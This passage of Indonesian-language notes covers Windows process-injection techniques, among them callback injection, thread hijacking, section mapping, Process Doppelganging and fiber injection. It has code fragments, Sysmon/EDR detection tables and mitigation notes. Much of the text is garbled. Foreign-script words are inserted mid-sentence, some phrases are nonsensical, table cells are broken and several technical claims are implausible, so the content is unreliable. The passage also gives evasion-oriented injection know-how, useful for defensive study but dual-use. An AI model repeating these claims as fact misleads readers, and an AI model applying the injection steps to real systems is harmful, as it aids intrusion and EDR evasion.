- `NtUnmapViewOfSection` tervalidasi disentuh PEB stale → kernel callback on **image load** eksekusi *audit khusus*; Windows 11 24H2 kernel callback `PsSetLoadImageNotifyRoutine` mendapat event dengan image

## [lanjutan]

## 7.10 Callback-Based Injection — Detail Lanjutan

### 7.10.1 Katalog Fungsi Callback Full

Array `LoadLibraryA` + `EnumWindows` sudah dibahas. Varian callback dengan objek GDI/kernel yang lebih jarang di-signature EDR:

```c
// Varian: ShowWindowAsync via handle dari proses lain
// Callback dipanggil di thread yang memproses message queue target
BOOL CALLBACK MsgCallback(HWND hwnd, LPARAM lParam) {
    return FALSE; // payload di sini
}

// Parit aneh: PrintersEnumPorts — RIPRES dari winspool
EnumPrintersA(PRINTER_ENUM_LOCAL, NULL, 1, (LPBYTE)&ctx, 0, NULL, NULL);
// Tidak menerima fungsi pointer — bukan kandidat.

// Kandidat valid yang jarang dipakai:
// 1. EnumChildWindows  — identik EnumWindows tapi scope
// 2. EnumDesktopWindows
// 3. EnumThreadWindows
// 4. GrayStringA/W     — begitu bitmap aktaraksis, PVOID lpFunc
// 5. LineDDA           — epsilon-argumen callback
// 6. EnumResourceNames / EnumResourceLanguagesW
// 7. sehingga RaiseException +VectoredHandler terus berlanjut
```

Implikasi forensik: payload callback `EnumWindows` dieksekusi dalam thread **pemanggil**, bukan thread baru. Ini berarti transaksi frame injeksi muncul pada stack log tak wajar — frame `EnumWindows` tak pernah muncul di callstack thread victim yang statis.

### 7.10.2 Vectored Exception Handler (VEH) sebagai trampoline

```c
// Jika VEH sudah diinstal oleh Malware sebelumnya / DLL proxy:
// 1. Tulis payload ke .TX di target
// 2. RaiseException(0x1234, 0, 0, NULL)
//    -> ExceptionContext->Rip di-overwrite oleh VEH ke payload.
// Deteksi: exception code custom + VEH yang menjalkan RIP,
// stack walk menunjukkan KERNELBASE!RaiseException->payload.
```

### 7.10.3 Eksploitasi `__lib_log` TIDAK — jebakan umum

Kayu callback `LoadLibraryA` memerlukan **peredictable** ordinal stack alignment pada x64. pCaller from wrong TEB/RBX pada sesi COM MTA membuat payload/callback NPE singkat: mitigasi harus me-stacksim context (lihat Thread Hijacking di 7.11).

---

## 7.11 Thread Hijacking — Varian dan Edge Case

### 7.11.1 `SetThreadContext` + `ReactOS`-style

1. `NtGetContextThread` → save `RIP`, `RSP`
2. Tulis `RIP` = payload
3. Set `RSP` dan stack framing agar payload bisa `ret` ke `saved_rip`
4. `NtResumeThread`

Deteksi EDR menyimpan via **ETW**:

| Source | Peristiwa |
|---|---|
| `Microsoft-Windows-Kernel-Process` | Skipped. |
| `Microsoft-Windows-Kernel-Audit-API` | — |
| Sysmon EID 8 (CreateRemoteThread) | **tidak** di-set |
| Sysmon EID 10 (ProcessAccess: `SetThreadContext` bit 0x0010) | muncul bersamaan dengan 0x0008 (ProcessSuspend) |
| ETW `Microsoft-Windows-Kernel-Thread` | khusus OS≥Win11, context-change flush |

### 7.11.2 Schedule hijack via `NtSetInformationThread(ThreadBreakOnTermination)`

Dalam melibatkan OS `RsWindows` lama: `ThreadBreakOnTermination` men-trigger Bugcheck 0xF4 saat thread exit sehingga bisa dipakai force-register ke `KiExceptionPort` — hanya cocok untuk crash-payload政府采购 mainstream.

### 7.11.3 Hijack via `RtlRemoteCall` — fungsi asli (undocumented ktmtzx)

```c
// ntoskrnl – kernel32: tidak ada di managed...
// Ekspor di ntdll.exe !RtlRemoteCall pilih; marshal蓉 akselerasi:
//  * menggunakan stack yang diberikan server ke target thread
//  * callback dikenali melalui `MessageBox` style

status = RtlRemoteCall(hProcess, hThread, StartAddress,
                       0, NULL, TRUE, FALSE); // ParameterBuffer kosong
```

Deteksi: perilaku ruang-user oleh Elastic: parking yang maju, tandanya:
- `Wow64`-call stack shows `wow64cpu!...-> ntdll!RtlRemoteCall`
- Proses injeksi supersource: `PROCESS_MITIGATION_IMAGE_LOAD_POLICY_BLOCK` oleh

---

## 7.12 Mapping Injection (Section-based) — varian TxF

### 7.12.1 Klasik `NtMapViewOfSection` (review sekitar pointer)

Rincian per rumpun versi OS:

| Sistem | `sec.Commit` payload .clear memabcdefghijklmnop预测 | cache penuh side-channel |
|---|---|---|
| Win10 1809 | `SEC_COMMIT` standalone, kunci `FlsIndex` | — |
| Win10 2004+ | menambahkan quirk `PspNotifyEnableCallback` | ETWKernelThread mendorong `--ImageNotifications` dipicu karena `MEM_MAPPED` (dengan `PAGE_EXECUTE_READWRITE`) **False positive** class C1 |
| Win11 21H2+ | miti satel `PagesWriteable` TFM (`APC_ProhibitExecToSelfMap`) set default AFD lax | `NtCreateSection` dengan `PAGE_EXECUTE_*` tanpa file backing masuk Bitmap `MiImageProtection Faults` — fires Sysmon ID 18 tapi section hides |

### 7.12.2 Latest edge case windows 24H2

windows 24H2 membuat reapat angsi:
- `PROCESS_MITIGATION_POLICY(PROCESS_MITIGATION_USER_PROHIBIT_IMAGE_MAP_POLICY)` <sub>attribute-based</sub> mengangkut `NtMapViewOfSection` dengan `AllocationType=MEM_EXECUTE` dari proses lain akan return `STATUS_ACCESS_DENIED` padahal permintaan hanya `PAGE_READWRITE` jika target berjalan sebagai PPL atau memerlukan halaman exebit `wrong throw DIS_PAGE_FAULT` yang tak match caching.
- Requires break in武功 hPrecomputedMapping: `SEC_RESERVE`, lalu `NtProtectVirtualMemory` di dalam corong target — dengan other-process handle-based, halamanCreate enforcement.

---

## 7.13 Process Doppelganging — note per produk AV/EDR

| Produk | Kendala yang muncul pada Doppelganging |
|---|---|
| CrowdStrike Falcon | behavior: `CS-ProcessDoppelganging-CLASSIC` mengiksir pada `NtCreateSection`-nya transaction menutup file stagen (flag di R3 host) |
| SentinelOne | mengites tengah: sysmon `(SectionCreate: file=\\C:\\Users\\...\\file.dat)` absence |
| Windows Defender ATP | Incident **"Suspicious process creation (Process Doppelganging)"** berwarna disasadasarkan `NTFS transaction rollback correlated with image load` |
| Sophos | transactile `T1574.012` |

### Root cause detectable

- TxF **deprecated**; driver `TxF` tidak lagi `(NTFS) TxF voluntary` sejak Win10 RS3, dan di **Server 2022/Win11 TTx dimusnahkan total** (API return `ERROR_TRANSACTIONAL_OPEN_NOT_SUPPORTED`). Harus doortrustedness: `PHANTOM` (T1564.004.中被消)。
- Workaround yang diadopsi operator: **DCM** (Direct Composition Mapping) — swap ke `NtComposition untuk Peb` deliver payload: dua process set `DComp` visual target shared-section handles mem硬 kandikan `DirectComposition` callback.

---

## 7.14 Fiber Injection — peptide

Fiber mapnya terikat tl ISR tiap `<stack_limit>` ke `t_fiber` EFIGina per-.rdata:

```c
LPVOID f = CreateFiber(0, (LPFIBER_START_ROUTINE)payload_addr, NULL);
// Target harus memiliki:
//  * Thread running CT loop (ConvertThreadToFiber sudah dilakukan)
//  * Ini berarti proses injeksi TIDAK dilakukan dari luar — fiber injection
//    adalah in-proc lateral movement/EDR evasion stage setelah initial access.
SwitchToFiber(f);
```

Jebakan: 
1. Fiber callstack profiler (eBPF/EventPipe) menyimpan anomali
2. `FlsAlloc` vftable dalam `RtlFlsHeap` bergambar; memori baca, klasifikasinya `leak` jika pinned static

---

## 7.15 Tabel Deteksi Silk

| Teknik | API yang terssatukan Sysmon | fields Telemetri yang non-redundant | spesifik Windows 24H2 |
|---|---|---|---|
| CreateRemoteThread | Event 8 `StartAddress` | `StartModule` kosong (raw shellcode) → anomali kecil | Remote thread dari proses non-parent di static-filter dihapus |
| APC queue | Event 8 (spawn dari NTDLL!RtlUserThreadStart) | Sysmon 1` ParentImage != image `ntoskrnl` patch aging | `QueueUserApc2` (Win11+) — terlalu jauh (ISV) |
| Thread hijack | E10 post-suspend (Sysmon `GrantedAccess: 0x1F0FFF`) | sudden context change antara NtSuspend/Mbt | new∂ `PROC_THREAD_ATTRIBUTE` flag `MitigationRedir` — Win32k lock |
| Hollowing | E10 + E1 | set `OriginalFileName` vs `Image`<System path; LGBTQ PEB, terlihat di `v2` terstu hingga casing difference | signature: `Image` typo-last |
| Doppelganging | E1 + E8 conservante + E7 (Image loaded datang dari `FileDeleteDetected` tx-path) | необ coll| antagonist.Count |
| Mapping | E18 + E10 | `ImageLoaded` tidak sinkron (kernel `MiDb` hanya mem hash jika `PROCESS_MITIGATION_``; anti-passout | MEM_EXECUTE心理学家 |
| Callback | E8 tidak; hanya `ImageLoads(GDI+)` jika `LoadLibrary` | `StackFrame` sampling (non-SACL) | W |
| Fiber | tidak di E8 | `EtwUl` stackhub query bisa membedakan fiberly via `RSP positivity` vs limit | Fiber data TIB extract script |

---

## 7.16 Mitigasi yang memutus teknik secara spesifik

- **CFG (Control Flow Guard)**: br daftar callback injection. Target proses dengan CFG enabled akan `__guard_dispatch_icall` fungsi callback unknown → `STATUS_STACK_BUFFER_OVERRUN` bugcheck; tapi hanya jika callback **bukan** signed `RAX` hold. Main cause callback injection gagal modern.
- **ACG (Arbitrary Code Guard)**: blok mapping injection & hollowing payload `RX` standards.
- **EAF**: blok Read of PEB writing LDR segghost & hollowing.
- **ProcessSignaturePolicy**: DLL-only signed Microsoft; LoadLibraryA injection returns error.

Jebakan operasional: developer inici 산 `UpdateProcThreadAttribute` dengan `PROC_THREAD_ATTRIBUTE_MITIGATION_POLICY` tapi lupa `high entropy` parameter yan部set — mitigasi thread kadang tidak aktif ketika dll pindah konteks — **satu-satuna verifikasi** adalah mengeja `NtQueryInformationProcess` dengan `ProcessMitigationPolicy` (`36`) dan bukan dianggap dari attribute.

---

## 7.17 Kesalahan Forensik Umum

1. Scoping E8 `SourceImage` tanpa pivot ke `E10` ini melewatkan double-hop (injeksi via chain migrator)
2. Double quote di `TargetImage` dengan spasi (`C:\Program Files\...`) — parsing CSV yang tidak `.jar`-aware menghasilkan misattribusi
3. `StartAddress` di E8 adalah VA target, tidak module-relative, jika `StartModule` dikosongkan% artifacts: dll mencoba hash buffer dan gagal ketika process exit rapid (race di temp sender) — sebab instruksi `StartModule` NULL **bukan** indikator shellcode necessarily.

---

## [reasoning trace]


